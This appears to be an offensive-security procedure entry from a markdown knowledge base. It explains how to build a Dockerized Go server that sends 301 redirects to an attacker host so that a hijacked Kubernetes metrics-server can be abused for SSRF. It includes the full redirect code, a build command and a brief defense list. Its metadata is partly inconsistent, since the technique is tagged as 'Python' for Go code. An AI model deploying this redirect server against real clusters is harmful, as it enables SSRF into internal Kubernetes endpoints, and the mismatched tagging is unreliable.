---
tags:
  - ssrf
  - docker
  - go
type: procedure
tools:
  - '[[tools/Docker]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Python]]'
updated_at: '2025-12-14T17:32:38.994Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 0e8fd189-c264-4f1a-ac9c-a9a3ede93cfc
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Python]]'
---
# Build-Malicious-Redirection-Server

## Summary

This procedure builds a Go-based API server in a Docker container that responds with 30X redirects, enabling SSRF exploitation when deployed as a hijacked aggregated API server in Kubernetes.

## Description

In the context of Kubernetes vulnerabilities, this creates a malicious redirection server using Go to return HTTP 301/302 redirects to arbitrary endpoints. The server is containerized for deployment in the kube-system namespace, targeting metrics-server hijacking. Prerequisites include Go installed and Docker for building the image. Expected outcome is a runnable image that redirects clients without validation.

## Requirements

1. Go runtime installed (version 1.16+)
2. Docker daemon running
3. Source code (main.go) implementing redirect logic

## Defense

Defensive measures and detection strategies:

- Validate redirect locations in API clients
- Monitor unusual pod deployments in kube-system
- Use network policies to restrict inter-pod traffic

## Objectives

1. Create a redirection server for SSRF payload
2. Containerize for Kubernetes deployment
3. Test redirect functionality locally

## Instructions

### Step 1: Prepare Go Source

**Context**: Write or obtain main.go that sets up an HTTP server returning 30X redirects to a specified host (e.g., attacker IP).

No command needed; ensure main.go includes:

```go
package main
import (
    "net/http"
    "log"
)

func main() {
    http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
        w.Header().Set("Location", "http://attacker-ip:80/")
        w.WriteHeader(301)
    })
    log.Fatal(http.ListenAndServe(":8080", nil))
}
```

> Builds a basic redirect endpoint.

### Step 2: Build Docker Image

**Context**: Use Docker to create the image from the Go source, tagging it for deployment.

**Command** ([[tools/Docker]]):

```bash
docker build -t weinong/go-redirect -f Dockerfile .
```

> Assumes Dockerfile with FROM golang, COPY main.go, RUN go build, CMD ["./redirect"]. Expected output: Successfully tagged weinong/go-redirect:latest.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Python]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Docker]]

## Tags

- ssrf
- docker
- go
